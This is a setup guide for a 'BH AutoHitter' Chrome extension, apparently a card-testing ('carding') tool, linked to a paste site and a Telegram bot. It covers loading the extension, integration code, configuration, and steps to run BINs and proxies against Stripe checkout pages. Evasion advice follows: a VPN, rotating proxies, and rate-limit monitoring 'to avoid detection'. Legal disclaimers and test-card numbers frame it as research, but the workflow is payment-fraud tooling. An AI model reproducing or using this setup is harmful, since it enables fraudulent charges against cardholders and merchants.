# BH AutoHitter Integration Setup Guide
## Personal Use Only - NOT for Commercial Purposes

This guide will help you integrate the BH AutoHitter Chrome extension with your Skybin website (https://nullme.lol) and a personal Telegram bot.

## ⚠️ Important Legal Notice

This integration is for **educational and personal research purposes only**. Using automated payment testing tools may violate:
- Terms of Service of payment processors
- Computer fraud laws
- Wire fraud regulations
- Various cybersecurity laws

**Never use this for:**
- Testing with real payment cards you don't own
- Commercial purposes
- Fraudulent activities
- Unauthorized access to payment systems

## Prerequisites

1. **BH AutoHitter Chrome Extension** (extracted from BH.zip)
2. **Skybin Website** running at https://nullme.lol
3. **Telegram Bot Token** (from @BotFather)
4. **Your Telegram User ID**
5. **Python 3.8+** for Telegram bot
6. **Rust** for Skybin API integration

## Installation Steps

### 1. Chrome Extension Setup

1. Open Chrome and go to `chrome://extensions/`
2. Enable "Developer mode"
3. Click "Load unpacked"
4. Select the `BH_extracted` folder
5. The extension should now be installed

### 2. Web Integration Setup

1. Copy the web integration module to the extension:
```bash
cp /home/null/Desktop/Carding/BH_Integration/web_api_integration.js \
   /home/null/Desktop/Carding/BH_extracted/scripts/
```

2. Add to the extension's background script (`background.js`):
```javascript
// Add at the top of background.js
import './web_api_integration.js';

// Initialize BH Web Integration
const bhIntegration = new BHWebIntegration({
    baseUrl: 'https://nullme.lol',
    authToken: 'YOUR_SECURE_TOKEN',
    encryptionKey: 'YOUR_ENCRYPTION_KEY'
});

// Initialize on extension startup
bhIntegration.init().then(config => {
    console.log('BH Web Integration initialized', config);
});

// Hook into hit events
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'hit_result') {
        // Send hit to Skybin
        bhIntegration.sendHitToSkybin(request.data);
        
        // Create paste for successful hits
        if (request.data.result === 'success') {
            bhIntegration.createHitPaste(request.data);
        }
    }
});
```

### 3. Skybin API Setup

1. Add the Rust API module to your Skybin project:
```bash
cp /home/null/Desktop/Carding/BH_Integration/skybin_bh_api.rs \
   /home/null/Desktop/Skybin/src/bh_integration.rs
```

2. Update your `Cargo.toml`:
```toml
[dependencies]
actix-web-actors = "4.0"
uuid = { version = "1.0", features = ["v4"] }
base64 = "0.21"
```

3. Add to your `main.rs`:
```rust
mod bh_integration;
use bh_integration::configure_bh_routes;

// In your App configuration
.configure(configure_bh_routes)
```

4. Run database migrations:
```bash
cd /home/null/Desktop/Skybin
sqlite3 skybin.db < migrations/bh_schema.sql
```

### 4. Telegram Bot Setup

1. Install Python dependencies:
```bash
pip install python-telegram-bot aiohttp cryptography
```

2. Configure the bot:
```python
# Edit telegram_bot.py
BOT_TOKEN = "YOUR_BOT_TOKEN_FROM_BOTFATHER"
YOUR_TELEGRAM_ID = YOUR_TELEGRAM_USER_ID  # Get from @userinfobot
```

3. Run the bot:
```bash
cd /home/null/Desktop/Carding/BH_Integration
python telegram_bot.py
```

### 5. Configuration

Create a configuration file `config.json`:

```json
{
    "skybin": {
        "url": "https://nullme.lol",
        "authToken": "bh_YOUR_SECURE_TOKEN",
        "encryptionKey": "YOUR_32_CHAR_ENCRYPTION_KEY"
    },
    "telegram": {
        "botToken": "YOUR_BOT_TOKEN",
        "userId": YOUR_USER_ID,
        "enabled": true
    },
    "autohitter": {
        "autoScreenshot": true,
        "sendToTelegram": true,
        "blurSensitiveInfo": true,
        "soundEnabled": false
    },
    "security": {
        "maxHitsPerDay": 100,
        "cooldownSeconds": 30,
        "requireAuth": true
    }
}
```

## Usage

### Via Chrome Extension

1. Navigate to a Stripe checkout page
2. Click the BH AutoHitter icon in Chrome
3. Configure your settings in the dashboard
4. Add BINs and proxies
5. Start auto-hitting

### Via Telegram Bot

1. Start the bot: `/start`
2. Use the dashboard to monitor hits
3. Add BINs and proxies through the bot
4. Control hitting remotely
5. Receive notifications for successful hits

### Via Skybin Website

1. Access the BH dashboard at: https://nullme.lol/bh-dashboard
2. View all hits as pastes
3. Export data in JSON/CSV format
4. Monitor real-time via WebSocket

## Security Recommendations

1. **Use a VPN** when running the extension
2. **Rotate proxies** frequently
3. **Use encrypted connections** (HTTPS/WSS)
4. **Limit access** to your personal Telegram ID only
5. **Don't share** your configuration or tokens
6. **Use test cards only** (like Stripe test cards)
7. **Monitor rate limits** to avoid detection
8. **Keep logs private** and encrypted

## Troubleshooting

### Extension not loading
- Check Chrome developer mode is enabled
- Verify manifest.json is valid
- Check console for errors

### Bot not responding
- Verify bot token is correct
- Check your Telegram ID
- Ensure Python dependencies are installed

### Skybin integration failing
- Check CORS settings
- Verify authentication tokens
- Check database permissions

### WebSocket connection issues
- Ensure WSS is configured properly
- Check firewall settings
- Verify SSL certificates

## Testing

Use Stripe's test card numbers:
- Success: 4242 4242 4242 4242
- Decline: 4000 0000 0000 0002
- Auth required: 4000 0025 0000 3155

## Important Notes

1. **This is for personal use only** - Do not distribute or sell
2. **Use responsibly** - Only test on authorized systems
3. **Respect rate limits** - Don't overwhelm services
4. **Keep private** - Don't share your setup publicly
5. **Monitor usage** - Be aware of what you're testing

## Support

For issues with:
- **Skybin**: Check the main Skybin documentation
- **Telegram Bot**: Refer to python-telegram-bot docs
- **Chrome Extension**: Check Chrome extension developer docs

Remember: This tool should only be used for legitimate security research and testing on systems you own or have explicit permission to test.